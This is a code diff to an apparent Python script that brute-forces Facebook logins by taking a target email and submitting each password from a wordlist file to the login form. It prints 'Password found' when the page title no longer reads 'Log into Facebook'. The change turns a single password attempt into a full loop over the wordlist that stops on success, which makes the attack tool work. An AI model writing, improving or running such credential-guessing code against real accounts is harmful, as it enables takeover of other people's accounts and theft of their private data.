@@ -37,26 +37,27 @@ while not os.path.exists(file_path):
     file_path = file_path.strip()
 
 # Open the file
-file = open(file_path, 'r')
+with open(file_path, 'r') as file:
+    email = input('Enter Email/Username: ')
 
-email = input('Enter Email/Username: ')
+    print("\nTarget Email ID: ", email)
 
-print("\nTarget Email ID: ", email)
+    for password in file:
+        password = password.strip()
+        print("[*] Trying: %s" % password)
 
-password = file.readline().strip()
-print("[*] Trying: %s" % password)
+        responses = browser.open(post_url)
 
-responses = browser.open(post_url)
+        browser.select_form(nr=0)  # Assuming the login form is the first form on the page
 
-browser.select_form(nr=0)  # Assuming the login form is the first form on the page
+        browser.form['email'] = email
+        browser.form['pass'] = password
 
-browser.form['email'] = email
-browser.form['pass'] = password
+        response = browser.submit()
+        response_data = response.read().decode('utf-8')  # Decode bytes to string
 
-response = browser.submit()
-response_data = response.read().decode('utf-8')  # Decode bytes to string
+        soup = BeautifulSoup(response_data, 'html.parser')
 
-soup = BeautifulSoup(response_data, 'html.parser')
-
-if soup.find('title') and 'Log into Facebook' not in soup.find('title').text:
-    print("Password found: %s" % password)
+        if soup.find('title') and 'Log into Facebook' not in soup.find('title').text:
+            print("Password found: %s" % password)
+            break
